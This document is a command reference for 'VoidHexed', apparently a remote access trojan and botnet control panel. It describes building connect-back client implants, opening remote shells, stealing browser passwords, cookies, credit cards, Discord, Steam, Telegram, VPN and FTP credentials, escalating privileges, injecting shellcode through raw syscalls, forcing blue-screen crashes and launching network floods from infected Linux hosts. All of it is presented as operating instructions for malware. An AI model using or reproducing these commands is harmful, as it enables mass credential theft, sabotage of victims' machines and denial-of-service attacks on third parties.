# VoidHexed — Command Reference

## General

### `list`
Lists all currently selected clients.

**Usage:**
```
list
```

**Output:** Prints `Client:<username>@<os>@<ip>` for each selected client.

---

### `clear`
Clears the command log output panel.

**Usage:**
```
clear
```

---

### `exit`
Clears the current client selection. Does not disconnect anything.

**Usage:**
```
exit
```

---

### `select <ip> [ip2 ...]`
Selects one or more clients by their `IP:Port` identifier (as shown in the client grid). Multiple IPs can be provided in a single command. A client already selected will not be added twice.

**Usage:**
```
select 192.168.1.10:54321
select 192.168.1.10:54321 192.168.1.11:54322
```

---

### `help [command]`
Shows all commands or detailed info for a specific command.

**Usage:**
```
help
help build
help cfg
```

---

### `log <ip>`
Navigates to the per-client log tab for the given IP. The log shows all command output received from that client (shell, syscall, stealer, file manager, exploit) along with connect/disconnect banners. The log persists for the duration of the server session; it is not saved to disk.

Also accessible via right-click → **View Log** on any row in the client grid.

**Usage:**
```
log 192.168.1.10:54321
```

---

### `cmd <ip>`
Opens the per-client terminal tab for the given IP. The tab shows the client's output log and has a dedicated command input at the bottom. Commands entered there are sent **exclusively to that client** — the global selection is temporarily overridden for each dispatch. Supports ↑↓ history and Tab autocomplete.

Also accessible via right-click → **Open Terminal** on any row in the client grid.

**Usage:**
```
cmd 192.168.1.10:54321
```

---

## Broadcast & Scheduling

### `broadcast <command>`
Sends a command to **all** connected clients, regardless of the current selection. The previous selection is restored afterwards. Nested `broadcast` calls are blocked.

**Usage:**
```
broadcast <command>
```

**Examples:**
```
broadcast cpu
broadcast lmachine
broadcast history
```

---

### `at <seconds> <command>`
Schedules a command to fire after a delay (in seconds). The client selection is captured at the time `at` is called, not when it fires. Returns a numeric task id.

**Usage:**
```
at <seconds> <command>
```

**Examples:**
```
at 30 cpu
at 300 broadcast lmachine
```

---

### `schedule list`
Lists all pending scheduled tasks with their id, command, scheduled fire time, and seconds remaining.

```
schedule list
```

---

### `schedule cancel <id>`
Cancels a pending scheduled task by its id (as shown by `schedule list`).

```
schedule cancel 1
schedule cancel 3
```

---

### `dryrun <on|off|command>`
Controls passive dry-run mode. In dry-run mode packets are **logged but not sent** to clients.

- `dryrun on` — enables global dry-run (persists until `dryrun off`)
- `dryrun off` — disables global dry-run
- `dryrun <command>` — runs a single one-shot simulation; global flag is unchanged

When active, an **⊘ DRY-RUN** badge appears in the footer.

**Usage:**
```
dryrun on
dryrun off
dryrun cpu
dryrun broadcast lmachine
```

---

## Server

### `server start <servercert_label> <port>`
Starts a TLS 1.3 mTLS listener using a named server certificate from settings. The CA certificate must be configured first (`cfg ca`). Use `cfg servercert list` to see available labels.

**Usage:**
```
server start myserver 4444
```

| Argument           | Description                                      |
|--------------------|--------------------------------------------------|
| `servercert_label` | Label of a server cert stored in settings        |
| `port`             | TCP port to listen on                            |

---

## Builder

### `build <hostname> <port> <clientcert_label> <w|l>`
Builds a client binary configured to connect back to the given hostname and port. Uses a named client certificate from settings. Requires a configured WebAPI (via `license register <email> <key> <server> <port> [cert_sha256]`) or explicit WebAPI args.

**Usage (uses saved WebAPI settings):**
```
build example.com 4444 myclient w
build 192.168.1.1 4444 myclient l
```

**Usage (explicit WebAPI override):**
```
build webapi.example.com 5000 example.com 4444 myclient w
build webapi.example.com 5000 example.com 4444 myclient w <webapi_cert_sha256>
```

| Argument            | Description                                           |
|---------------------|-------------------------------------------------------|
| `webapi_hostname`   | (Optional) WebAPI server hostname (overrides saved)   |
| `webapi_port`       | (Optional) WebAPI server port (overrides saved)       |
| `webapi_cert_sha256`| Optional SHA-256 pin for self-signed WebAPI HTTPS     |
| `hostname`          | C2 domain or IP the client will connect to            |
| `port`              | C2 port                                               |
| `clientcert_label`  | Label of a client cert stored in settings             |
| `w` / `l`           | Target platform: `w` = Windows, `l` = Linux           |

---

## Settings (`cfg`)

### `cfg ca <create|set|remove|show>`
Manages the CA certificate stored in `settings.bin`.

**Usage:**
```
cfg ca create <password>
cfg ca set <pfx_path> <password>
cfg ca remove
cfg ca show
```

---

### `cfg servercert <create|add|remove|list|setport|autolisten>`
Manages server certificates. `create` generates a cert signed by the stored CA. `autolisten` starts the server automatically at launch.

**Usage:**
```
cfg servercert create <label> <password> [port] [autolisten]
cfg servercert add <label> <pfx_path> <password> [port] [autolisten]
cfg servercert setport <label> <port>
cfg servercert autolisten <label> <0|1>
cfg servercert list
cfg servercert remove <label>
```

**Examples:**
```
cfg servercert create myserver password456 4444 1
cfg servercert add myserver server.pfx password456 4444 1
cfg servercert setport myserver 5555
cfg servercert autolisten myserver 1
```

---

### `cfg clientcert <create|add|remove|list>`
Manages client certificates stored in `settings.bin`.

**Usage:**
```
cfg clientcert create <label> <password>
cfg clientcert add <label> <pfx_path> <password>
cfg clientcert remove <label>
cfg clientcert list
```

**Examples:**
```
cfg clientcert create myclient password789
cfg clientcert add myclient client.pfx password789
```

---

### `cfg task <add|remove|setcommand|settype|sethost|enable|disable|list>`
Manages on-connect automation tasks. When `remotehost` is `*`, the task runs on all clients connecting to that server port.

**Usage:**
```
cfg task add <label> <serverport> <remotehost> <win|lin|both> [command]
cfg task remove <label>
cfg task setcommand <label> <cmd>
cfg task settype <label> <win|lin|both>
cfg task sethost <label> <host>
cfg task enable <label>
cfg task disable <label>
cfg task list
```

**Examples:**
```
cfg task add harvest_win 4444 * win cpu
cfg task add info_all 4444 192.168.1.50 both lmachine
cfg task setcommand harvest_win history
cfg task settype harvest_win both
cfg task sethost harvest_win 10.0.0.5
cfg task enable harvest_win
cfg task disable harvest_win
cfg task remove harvest_win
```

| Argument      | Description                                              |
|---------------|----------------------------------------------------------|
| `remotehost`  | Target IP, or `*` to match all clients on that port      |
| `win/lin/both`| Client OS filter                                         |
| `command`     | Optional command to auto-execute on connect              |

---

### `cfg theme <dark|light>`
Switches the UI theme instantly and persists the choice to `settings.bin`. No restart required.

```
cfg theme dark
cfg theme light
```

---

### `cfg theme color <purple|blue|green|neutral>`
Switches the accent color instantly and persists to `settings.bin`. No restart required.

```
cfg theme color purple
cfg theme color blue
cfg theme color green
cfg theme color neutral
```

---

### `cfg show`
Displays a full summary of the current settings (certs, tasks, theme, firewall policy).

```
cfg show
```

---

### `cfg save`
Explicitly saves settings to `settings.bin`. Settings are auto-saved on every change, so this is rarely needed.

```
cfg save
```

---

### `cfg load`
Reloads `settings.bin` from disk.

```
cfg load
```

---

### `cfg export <path.json> [passphrase]`
Exports all settings to a JSON file. If a passphrase is provided the file is AES-256-GCM encrypted (magic header `VOID_ENC`).

```
cfg export settings_backup.json
cfg export settings_backup.json mypassphrase
```

---

### `cfg import <path.json> [passphrase]`
Imports settings from a JSON file. Automatically detects if the file is encrypted.

```
cfg import settings_backup.json
cfg import settings_backup.json mypassphrase
```

---

### `cfg heartbeat <seconds|off>`
Sets the heartbeat timeout. Clients that do not send any packet within this window are considered stale and disconnected by the cleanup timer. `0` or `off` disables the check.

```
cfg heartbeat 60
cfg heartbeat off
```

---

### `cfg ratelimit <max> [window_seconds]`  /  `cfg ratelimit off`
Enforces a per-IP connection rate limit. `max` connections per `window_seconds` (default 60) are allowed; excess connections are dropped before TLS. Use `off` to disable.

```
cfg ratelimit 10 30
cfg ratelimit off
```

---

### `sort <column> [asc|desc]`
Sorts the client grid by a column. Default direction is ascending. Persists until changed.

```
sort ip
sort os desc
sort user asc
sort hwid desc
sort country
```

Valid columns: `ip`, `os`, `user`, `hwid`, `country`, `connected`

---

### `note <ip> <text>` / `note <ip> clear`
Attaches a session-only annotation to a client, visible in the Note column of the grid. `clear` removes it.

```
note 192.168.1.10:54321 "high-value target"
note 192.168.1.10:54321 clear
```

---

### `log filter <all|error|success>`
Filters what is shown in the server log panel. Export (if configured) always captures all lines regardless.

```
log filter all
log filter error
log filter success
```

---

## Client Tools
All commands below require at least one client to be selected via `select`.

---

### `shell`
Opens a remote CMD shell on the selected client. Requires exactly **1** client selected.

**Usage:**
```
shell
```

Output appears in the command log as it arrives. Use `shellcmd` to send commands and `shellend` to close the session.

---

### `shellcmd <command>`
Sends a command to the active remote CMD shell. Requires exactly **1** client selected and an active shell session.

**Usage:**
```
shellcmd whoami
shellcmd ipconfig /all
shellcmd dir C:\Users
```

---

### `shellend`
Closes the remote CMD shell session and kills the process on the client.

**Usage:**
```
shellend
```

---

### `powershell`
Opens a remote PowerShell session on the selected client. Behaves identically to `shell` but launches `powershell.exe`. Requires exactly **1** client selected.

**Usage:**
```
powershell
```

---

### `powershellcmd <command>`
Sends a command to the active PowerShell session. Requires exactly **1** client selected.

**Usage:**
```
powershellcmd Get-Process
powershellcmd $env:USERNAME
powershellcmd Get-ChildItem C:\Users
```

---

### `powershellend`
Closes the active PowerShell session and kills the process on the client.

**Usage:**
```
powershellend
```

---

### `fm`
Opens a File Manager session with the selected client. Requires exactly **1** client selected.

**Usage:**
```
fm
```

---

### `cd [index | ..]`
Navigates the remote file system during a File Manager session.

**Usage:**
```
cd              -- refresh current directory
cd 0            -- enter folder at index 0
cd ..           -- go up one directory
```

| Argument | Description                                                |
|----------|------------------------------------------------------------|
| (none)   | Re-fetches the current remote directory                    |
| `index`  | Numeric index of a folder in the current directory listing |
| `..`     | Go up one directory level                                  |

---

### `disk <index>`
Switches the File Manager to a different disk/drive on the remote client.

**Usage:**
```
disk 0
disk 1
```

---

## Stealer / Info Commands
All stealer commands iterate all selected clients. Only **Windows** clients respond; Linux clients are silently skipped.

---

### `cpu`
Requests detailed CPU information (CPUID leaves, SMW, OS info) from the selected Windows client(s).

```
cpu
```

---

### `history`
Requests browser history from the selected Windows client(s).

```
history
```

---

### `autofill`
Requests browser autofill/saved form data from the selected Windows client(s).

```
autofill
```

---

### `keyword`
Requests keyword/credential data from the selected Windows client(s).

```
keyword
```

---

### `passwords`
Extracts saved passwords from all Chromium-based browsers (DPAPI + AES-256-GCM decryption) and Gecko-based browsers (key4.db + 3DES/PBKDF2 decryption). No elevation required.

```
passwords
```

---

### `cookies`
Extracts cookies from all Chromium-based browsers. Decrypts v10/v11 encrypted values using the DPAPI-protected master key.

```
cookies
```

---

### `creditcards`
Extracts saved credit card data from Chromium-based browsers. Decrypts card numbers using the DPAPI-protected master key.

```
creditcards
```

---

### `discord`
Extracts Discord tokens from Discord, Discord Canary, Discord PTB, and Lightcord. Handles both plaintext and encrypted tokens (dQw4w9WgXcQ prefix + Chromium key decryption).

```
discord
```

---

### `telegram`
Collects Telegram Desktop session files from the tdata directory (key_datas, session maps, 16-hex-char session files).

```
telegram
```

---

### `outlook`
Extracts Outlook credentials from the Windows Registry (Office 16.0/15.0 profiles). Decrypts DPAPI-protected passwords.

```
outlook
```

---

### `wechat`
Collects WeChat database files and account config from Documents\WeChat Files.

```
wechat
```

---

### `vpnconfig`
Extracts VPN configurations and credentials from 9 clients: NordVPN, ProtonVPN, OpenVPN, WireGuard (DPAPI .conf.dpapi), SoftEther, Surfshark, hidemy.name, Cisco AnyConnect, IPVanish.

```
vpnconfig
```

---

### `ftpcreds`
Extracts FTP/SSH credentials from FileZilla (base64 passwords), WinSCP (XOR deobfuscation with host+user key), and CyberDuck (.duck plist bookmarks).

```
ftpcreds
```

---

### `steam`
Extracts Steam authentication data: ssfn auth files, loginusers.vdf account names, and config.vdf ConnectCache tokens.

```
steam
```

---

### `roblox`
Extracts .ROBLOSECURITY cookies from all Chromium-based browser cookie databases.

```
roblox
```

---

### `module`
Requests the list of currently loaded modules (DLLs / mapped images) from the selected Windows client(s).

```
module
```

---

### `acquire_privilege <luid>`
Asks the selected Windows client(s) to acquire a Windows privilege by its LUID ordinal.

**Usage:**
```
acquire_privilege 20
acquire_privilege 29
```

**Common LUID values:**

| Value | Constant                         |
|-------|----------------------------------|
| `7`   | `SeTokenPrivilege` (TCB)         |
| `8`   | `SeSecurityPrivilege`            |
| `9`   | `SeTakeOwnershipPrivilege`       |
| `10`  | `SeLoadDriverPrivilege`          |
| `17`  | `SeBackupPrivilege`              |
| `18`  | `SeRestorePrivilege`             |
| `19`  | `SeShutdownPrivilege`            |
| `20`  | `SeDebugPrivilege`               |
| `28`  | `SeManageVolumePrivilege`        |
| `29`  | `SeImpersonatePrivilege`         |

---

### `adjust_privilege <luid>`
Asks the selected Windows client(s) to adjust a Windows privilege by its LUID. Mirrors `acquire_privilege` but targets the adjust path.

**Usage:**
```
adjust_privilege 20
```

---

## Native Address Resolution Commands
Resolve module base addresses and exported function addresses inside the remote process using the embedded ExportedDLL native helper. **Windows clients only.**

---

### `getmodulebaseaddress <module_name>`
Calls `GetModuleBaseAddressRemote` (ExportedDLL ordinal 101) on the selected Windows client(s). Returns the base address of the specified loaded module, or `0x0` if the module is not currently loaded. Module name is compared case-insensitively (wide string).

**Usage:**
```
getmodulebaseaddress <module_name>
```

**Examples:**
```
getmodulebaseaddress ntdll.dll
getmodulebaseaddress kernel32.dll
getmodulebaseaddress user32.dll
```

---

### `getprocedureaddress <module_name> <function_name>`
Calls `GetProcedureAddressRemote` (ExportedDLL ordinal 100) on the selected Windows client(s). Resolves the address of an exported function within a loaded module. Module name is a wide string; function name is ANSI. Returns `0x0` if the module is not loaded or the export does not exist.

**Usage:**
```
getprocedureaddress <module_name> <function_name>
```

**Examples:**
```
getprocedureaddress ntdll.dll NtAllocateVirtualMemory
getprocedureaddress kernel32.dll VirtualAlloc
getprocedureaddress user32.dll MessageBoxW
```

---

## Native Execution Commands
Direct native execution primitives using ExportedDLL EvasiveNT shellcode. **Windows clients only.**

---

### `pebinfo`
Reads PEB fields from the remote process via ExportedDLL ordinal 107 (direct PEB intrinsic read, no EvasiveNT). Returns ImageBase, BeingDebugged, ProtectedProcess, ProtectedProcessLight (PPL), NtGlobalFlag, and OS version.

**Usage:**
```
pebinfo
```

---

### `queryprocess <infoClass> [bufferSize]`
Calls `NtQueryInformationProcess` via EvasiveNT (ordinal 108) on the current process. `infoClass` is a decimal integer — e.g. `0` = `ProcessBasicInformation`, `7` = `ProcessDebugPort`, `29` = `ProcessWow64Information`. Returns a hex dump of the raw output buffer. Default buffer size is 512 bytes.

**Usage:**
```
queryprocess <infoClass> [bufferSize]
```

**Examples:**
```
queryprocess 0
queryprocess 7 64
queryprocess 29 1024
```

---

### `createthread <address_hex> [arg_hex]`
Creates a thread in the local process at `address_hex` via `NtCreateThreadEx` using EvasiveNT (ordinal 109). The thread starts immediately (CreateFlags=0). Returns NTSTATUS and the thread handle on success. Both address and argument are hex (with or without `0x` prefix).

**Usage:**
```
createthread <address_hex> [arg_hex]
```

**Examples:**
```
createthread 0x7FF812340000
createthread 7FF812340000 0
createthread 0x7FF812340000 1A2B3C
```

---

### `impersonate`
Impersonates the current process token on the current thread using a 3-step EvasiveNT sequence (ordinal 110): `NtOpenProcessTokenEx` → `NtDuplicateToken (TokenImpersonation)` → `NtSetInformationThread (ThreadImpersonationToken)`. Returns NTSTATUS.

**Usage:**
```
impersonate
```

---

### `bsod [errorcode_hex]`
Triggers an immediate system crash on the remote machine via `NtRaiseHardError` with `ResponseOption = 6` (`OptionShutdownSystem`) using EvasiveNT (ordinal 111). The machine will BSOD and restart immediately. Default error code is `0xC000021A` (`STATUS_SYSTEM_PROCESS_TERMINATED`). **Irreversible — use with extreme caution.**

**Usage:**
```
bsod [errorcode_hex]
```

**Examples:**
```
bsod
bsod 0xC000021A
bsod C0000005
```

---

### `callproc <address_hex> [arg1_hex] [arg2_hex] ...`
Calls an arbitrary function pointer at `address_hex` via `CallAnyArray` ASM (ordinal 112). Arguments are passed as hex values. Up to 4 args go through `rcx`/`rdx`/`r8`/`r9`; additional args are pushed on the stack at `[rsp+32+n*8]`. Returns the 64-bit `RAX` return value.

**Usage:**
```
callproc <address_hex> [arg1_hex] [arg2_hex] ...
```

**Examples:**
```
callproc 0x7FF812340000
callproc 7FF812340000 1 2 3
callproc 0x7FF812340000 DEADBEEF 0 0 0 1
```

---

### `tebinfo`
Reads TEB (Thread Environment Block) fields of the client's current thread via hardcoded raw byte offsets (stable Win10/11 22000 and 26200.6584). No syscall — reads directly from `GS:[0x30]`. Uses ExportedDLL ordinal 113.

| Field | TEB offset | Description |
|-------|-----------|-------------|
| ProcessId | +0x40 | Current process ID |
| ThreadId | +0x48 | Current thread ID |
| LastErrorValue | +0x68 | Win32 last error |
| LastStatusValue | +0x1250 | NTSTATUS of last NT call |
| CurrentLocale | +0x108 | Thread locale ID |
| WOW32Reserved | +0x100 | Non-zero = WOW64 process |
| IsImpersonating | +0x179C | Non-zero after successful `impersonate` |
| SameTebFlags | +0x17EE | HasImpersonation, SafeThunkCall, InDbgPrint |
| CrossTebFlags | +0x17EC | Cross-thread flags |

**Usage:**
```
tebinfo
```

---

### `ksharedinfo`
Reads `KUSER_SHARED_DATA` at fixed user-mode address `0x7FFE0000` (always readable, no privileges required). Uses ExportedDLL ordinal 114. All offsets stable in Win10/11 22000 and 26200.6584.

| Field | Offset | Description |
|-------|--------|-------------|
| OSVersion | 0x26C/0x270/0x260 | Major.Minor.Build |
| NtProductType | 0x264 | 1=Workstation, 2=DC, 3=Server |
| NativeProcessorArch | 0x26A | 0=x86, 9=x64, 12=ARM64 |
| BootId | 0x2C4 | Boot counter (increments each reboot) |
| ActiveConsoleId | 0x2D8 | Active console session ID |
| NumberOfPhysicalPages | 0x2E8 | Physical RAM in 4KB pages |
| SafeBootMode | 0x2EC | Non-zero = safe mode boot |
| KdDebuggerEnabled | 0x2D4 | bit0=enabled, bit1=not present |
| MitigationPolicies | 0x2D5 | bit0=DEP, bit2=CFG, bit4=SEHOP |
| SharedDataFlags | 0x2F0 | DbgErrorPort, DbgElevation, VdmAllowed, SysDbg |
| NtSystemRoot | 0x030 | Windows install path (WCHAR[260]) |

**Usage:**
```
ksharedinfo
```

---

## Syscall Commands
All syscall commands are sent through the `syscall` dispatcher. They require at least one Windows client selected.

**General form:**
```
syscall <name> [args...]
```

Arguments accept both decimal and `0x`-prefixed hex integers. Negative decimal values (e.g. `-1`) are interpreted as their unsigned 64-bit equivalent (`-1` → `0xFFFFFFFFFFFFFFFF`, useful for pseudo-handles). `-2` is the current thread pseudo-handle.

---

### `syscall ntallocatevirtualmemory`
Allocates a region of virtual memory (`NtAllocateVirtualMemory`).

```
syscall ntallocatevirtualmemory <hProcess> <BaseAddr> <ZeroBits> <RegionSize> <AllocType> <Protect>
```

**Examples:**
```
-- Allocate 0x1000 bytes in the current process (any address, commit+reserve, RW)
syscall ntallocatevirtualmemory -1 0 0 0x1000 0x3000 0x4

-- Reserve+commit 4096 bytes at a specific address with PAGE_EXECUTE_READ
syscall ntallocatevirtualmemory -1 0x21b0c150000 0 0x1000 0x3000 0x20
```

**AllocationType flags:**

| Value      | Meaning                         |
|------------|---------------------------------|
| `0x1000`   | `MEM_COMMIT`                    |
| `0x2000`   | `MEM_RESERVE`                   |
| `0x3000`   | `MEM_COMMIT \| MEM_RESERVE`     |
| `0x100000` | `MEM_TOP_DOWN`                  |

**Protect flags:**

| Value  | Meaning                  |
|--------|--------------------------|
| `0x02` | `PAGE_READONLY`          |
| `0x04` | `PAGE_READWRITE`         |
| `0x10` | `PAGE_EXECUTE`           |
| `0x20` | `PAGE_EXECUTE_READ`      |
| `0x40` | `PAGE_EXECUTE_READWRITE` |

---

### `syscall ntfreevirtualmemory`
Frees or decommits a region of virtual memory. `FreeType`: `0x4000` = Decommit, `0x8000` = Release.

```
syscall ntfreevirtualmemory <hProcess> <BaseAddr> <RegionSize> <FreeType>
```

**Example:**
```
syscall ntfreevirtualmemory -1 0x21b0c150000 0 0x8000
```

---

### `syscall ntreadvirtualmemory`
Reads memory from a target process. The result is returned by the client.

```
syscall ntreadvirtualmemory <hProcess> <BaseAddr> <Size>
```

**Example:**
```
syscall ntreadvirtualmemory -1 0x7ff000000000 0x100
```

---

### `syscall ntwritevirtualmemory`
Writes data into a target process. Buffer can be a quoted file path or a raw hex string.

```
-- From a file
syscall ntwritevirtualmemory <hProcess> <BaseAddr> "<filepath>"

-- From a hex string
syscall ntwritevirtualmemory <hProcess> <BaseAddr> <hexbuffer>
```

**Examples:**
```
syscall ntwritevirtualmemory -1 0x21b0c150000 "C:\payloads\shellcode.bin"
syscall ntwritevirtualmemory -1 0x7ff000000000 EFBEADDE
```

---

### `syscall ntprotectvirtualmemory`
Changes memory protection on a region. `OldProtect` is returned by the client.

```
syscall ntprotectvirtualmemory <hProcess> <BaseAddr> <RegionSize> <NewProtect>
```

**Examples:**
```
syscall ntprotectvirtualmemory -1 0x21b0c150000 0x1000 0x20
syscall ntprotectvirtualmemory -1 0x7ff000000000 0x1000 0x4
```

---

### `syscall ntqueryvirtualmemory`
Queries properties of a virtual memory region. `InfoClass` 0 = `MemoryBasicInformation`.

```
syscall ntqueryvirtualmemory <hProcess> <BaseAddr> <InfoClass> <InfoLen>
```

**Example:**
```
syscall ntqueryvirtualmemory -1 0x7ff000000000 0 0x30
```

---

### `syscall ntcreatesection`
Creates a section object. Use `0` for `hSection` (output). Set `hFile=0` for an anonymous section.

```
syscall ntcreatesection <hSection> <DesiredAccess> <MaxSize> <PageProtect> <AllocAttr> <hFile>
```

**Example:**
```
syscall ntcreatesection 0 0xf001f 0x1000 0x4 0x8000000 0
```

---

### `syscall ntmapviewofsection`
Maps a section into the address space of the target process.

```
syscall ntmapviewofsection <hSection> <hProcess> <BaseAddr> <ZeroBits> <CommitSize> <SectionOffset> <ViewSize> <InheritDisp> <AllocType> <PageProtect>
```

**Example:**
```
syscall ntmapviewofsection 0x1a4 -1 0 0 0 0 0 2 0 0x4
```

---

### `syscall ntunmapviewofsection`
Unmaps a view of a section from the address space of the target process.

```
syscall ntunmapviewofsection <hProcess> <BaseAddr>
```

**Example:**
```
syscall ntunmapviewofsection -1 0x21b0c150000
```

---

### `syscall ntopenprocess`
Opens a handle to a process by PID. `hProcess` is the output handle (use `0`). `TID` is usually `0`.

```
syscall ntopenprocess <hProcess> <DesiredAccess> <PID> <TID>
```

**Example:**
```
syscall ntopenprocess 0 0x1fffff 1234 0
```

---

### `syscall ntopenthread`
Opens a handle to a thread by TID. `hThread` is the output handle (use `0`).

```
syscall ntopenthread <hThread> <DesiredAccess> <PID> <TID>
```

**Example:**
```
syscall ntopenthread 0 0x1fffff 0 5678
```

---

### `syscall ntterminateprocess`
Terminates a process with the given NTSTATUS exit code.

```
syscall ntterminateprocess <hProcess> <ExitStatus>
```

**Example:**
```
syscall ntterminateprocess 0x1a4 0
```

---

### `syscall ntterminatethread`
Terminates a thread with the given NTSTATUS exit code.

```
syscall ntterminatethread <hThread> <ExitStatus>
```

**Example:**
```
syscall ntterminatethread 0x2b0 0
```

---

### `syscall ntsuspendprocess`
Suspends all threads in a target process.

```
syscall ntsuspendprocess <hProcess>
```

**Example:**
```
syscall ntsuspendprocess 0x1a4
```

---

### `syscall ntresumeprocess`
Resumes all threads in a previously suspended process.

```
syscall ntresumeprocess <hProcess>
```

**Example:**
```
syscall ntresumeprocess 0x1a4
```

---

### `syscall ntsuspendthread`
Suspends a single thread. `SuspendCount` is returned by the client.

```
syscall ntsuspendthread <hThread>
```

**Example:**
```
syscall ntsuspendthread 0x2b0
```

---

### `syscall ntresumethread`
Resumes a previously suspended thread. `SuspendCount` is returned by the client.

```
syscall ntresumethread <hThread>
```

**Example:**
```
syscall ntresumethread 0x2b0
```

---

### `syscall ntalertthread`
Sends an alert to a thread to wake it from an alertable wait.

```
syscall ntalertthread <hThread>
```

**Example:**
```
syscall ntalertthread 0x2b0
```

---

### `syscall ntalertresumethread`
Alerts and resumes a thread. Decrements the suspend count and sends an alert.

```
syscall ntalertresumethread <hThread>
```

**Example:**
```
syscall ntalertresumethread 0x2b0
```

---

### `syscall ntalertthreadbythreadid`
Sends an alert to a thread by its TID rather than a handle.

```
syscall ntalertthreadbythreadid <ThreadId>
```

**Example:**
```
syscall ntalertthreadbythreadid 5678
```

---

### `syscall ntduplicateobject`
Duplicates a handle from one process into another.

```
syscall ntduplicateobject <hSrcProc> <hSrc> <hDstProc> <hDst> <DesiredAccess> <Attrs> <Options>
```

**Example:**
```
syscall ntduplicateobject -1 0x1a4 -1 0 0x1fffff 0 0x2
```

---

### `syscall ntclose`
Closes a kernel object handle.

```
syscall ntclose <handle>
```

**Example:**
```
syscall ntclose 0x1a4
```

---

### `syscall ntopenfile`
Opens a file via NT object path. `hFile` is the output handle (use `0`). `ObjectAttributes` (path) must be set on the client.

```
syscall ntopenfile <hFile> <DesiredAccess> <ShareAccess> <OpenOptions>
```

**Example:**
```
syscall ntopenfile 0 0x80100080 0x7 0x60
```

---

### `syscall ntopenprocesstoken`
Opens the access token associated with a process. Use `-1` for the current process.

```
syscall ntopenprocesstoken <hProcess> <DesiredAccess>
```

**Example:**
```
syscall ntopenprocesstoken -1 0x2000000
```

---

### `syscall ntopenthreadtoken`
Opens the access token associated with a thread. Use `-2` for the current thread.

```
syscall ntopenthreadtoken <hThread> <DesiredAccess> <OpenAsSelf>
```

**Example:**
```
syscall ntopenthreadtoken -2 0x2000000 1
```

---

### `syscall ntqueryinformationprocess`
Queries information about a process. `InfoLen` is the output buffer size.

```
syscall ntqueryinformationprocess <hProcess> <InfoClass> <InfoLen>
```

**Examples:**
```
syscall ntqueryinformationprocess -1 0 0x30
syscall ntqueryinformationprocess -1 29 0x8
```

---

### `syscall ntqueryinformationthread`
Queries information about a thread. Use `-2` for the current thread pseudo-handle.

```
syscall ntqueryinformationthread <hThread> <InfoClass> <InfoLen>
```

**Example:**
```
syscall ntqueryinformationthread -2 9 0x8
```

---

### `syscall ntqueryinformationtoken`
Queries information about a token. `InfoLen` is the output buffer size.

```
syscall ntqueryinformationtoken <hToken> <InfoClass> <InfoLen>
```

**Example:**
```
syscall ntqueryinformationtoken 0x1b0 1 0x1c
```

---

### `syscall ntquerysysteminformation`
Queries system information by class. `InfoLen` is the buffer size in bytes.

```
syscall ntquerysysteminformation <InfoClass> <InfoLen>
```

**Example:**
```
syscall ntquerysysteminformation 5 0x1000
```

---

### `syscall ntsetinformationprocess`
Sets information on a process. `HexData` is a hex string of raw bytes for the info struct.

```
syscall ntsetinformationprocess <hProcess> <InfoClass> <HexData>
```

**Example:**
```
syscall ntsetinformationprocess -1 29 0100000000000000
```

---

### `syscall ntsetinformationthread`
Sets information on a thread. `HexData` is a hex string of raw bytes for the info struct.

```
syscall ntsetinformationthread <hThread> <InfoClass> <HexData>
```

**Example:**
```
syscall ntsetinformationthread -2 17 0000000000000000
```

---

### `syscall ntimpersonatethread`
Makes a server thread impersonate a client thread's security context.

```
syscall ntimpersonatethread <hServer> <hClient> <ImpersonationLevel> <ContextTracking> <EffectiveOnly>
```

**Example:**
```
syscall ntimpersonatethread -2 0x2b0 2 1 0
```

---

### `syscall ntadjustprivilegestoken`
Adjusts privileges in an access token. `DisableAll=1` removes all privileges, `0` uses the embedded `NewState`.

```
syscall ntadjustprivilegestoken <hToken> <DisableAll>
```

**Examples:**
```
syscall ntadjustprivilegestoken 0x1b0 0
syscall ntadjustprivilegestoken 0x1b0 1
```

---

### `syscall ntshutdownsystem`
Initiates a system shutdown. `Action`: `0` = PowerOff, `1` = Reboot, `2` = Hibernate.

```
syscall ntshutdownsystem <Action>
```

**Examples:**
```
syscall ntshutdownsystem 0
syscall ntshutdownsystem 1
```

---

### `syscall ntinitiatedpoweraction`
Initiates a power action on the system (sleep, hibernate, etc.).

```
syscall ntinitiatedpoweraction <SysAction> <LightestState> <Flags> <Async>
```

**Example:**
```
syscall ntinitiatedpoweraction 1 4 0 0
```

---

### `syscall ntsetsystempowerstate`
Sets the system power state directly.

```
syscall ntsetsystempowerstate <TargetState> <Type> <RequestedState>
```

**Example:**
```
syscall ntsetsystempowerstate 0 0 0
```

---

### `syscall ntsetthreadexecutionstate`
Sets the thread execution state (e.g. prevent sleep).
Flags: `0x1` = SystemRequired, `0x2` = DisplayRequired, `0x80000000` = Continuous.

```
syscall ntsetthreadexecutionstate <NewFlags>
```

**Example:**
```
syscall ntsetthreadexecutionstate 0x80000001
```

---

### `syscall ntusergetforegroundwindow`
Returns the HWND of the currently active foreground window.

```
syscall ntusergetforegroundwindow
```

---

### `syscall ntuserquerywindow`
Queries window properties by HWND and index (e.g. owner PID, thread ID).

```
syscall ntuserquerywindow <hWnd> <Index>
```

**Example:**
```
syscall ntuserquerywindow 0x30080 0
```

---

## Network Attack

### `attack l3 <target> <threads> <maxpps> <time> <type> [layers]`
Sends a Layer 3 network attack to all selected **Linux** clients. Windows clients are silently skipped.

**Usage:**
```
attack l3 1.2.3.4 4 100000 60 2
attack l3 1.2.3.4 4 100000 60 1 10
```

| Argument  | Description                            |
|-----------|----------------------------------------|
| `target`  | Target IP address                      |
| `threads` | Number of attack threads on the client |
| `maxpps`  | Maximum packets per second             |
| `time`    | Attack duration in seconds             |
| `type`    | Attack type (see table below)          |
| `layers`  | Optional — see per-type notes          |

**Available attack types:**

| Value | Name          | `layers` param                                              |
|-------|---------------|-------------------------------------------------------------|
| `1`   | `IPv4NEncap`  | **Required** — number of encapsulation layers (e.g. `10`)  |
| `2`   | `ICMP`        | Not used                                                    |
| `3`   | `IGMP`        | Not used                                                    |

---

## Linux Shell Commands
All shell commands require exactly **1** Linux client selected. Windows clients are silently skipped.

---

### `bash`
Opens a remote `/bin/bash` session.

```
bash
```

---

### `bashcmd <command>`
Sends a command to the active bash session. The shell is stateful — `cd`, environment variables, etc. persist across calls.

```
bashcmd whoami
bashcmd id
bashcmd "cat /etc/passwd"
bashcmd "ls -la /root"
```

---

### `bashend`
Kills the bash process and closes the session.

```
bashend
```

---

### `sh`
Opens a remote `/bin/sh` (POSIX shell) session.

```
sh
```

---

### `shcmd <command>`
Sends a command to the active sh session.

```
shcmd uname -a
shcmd "cat /proc/version"
```

---

### `shend`
Kills the sh process and closes the session.

```
shend
```

---

## Linux System Info Commands
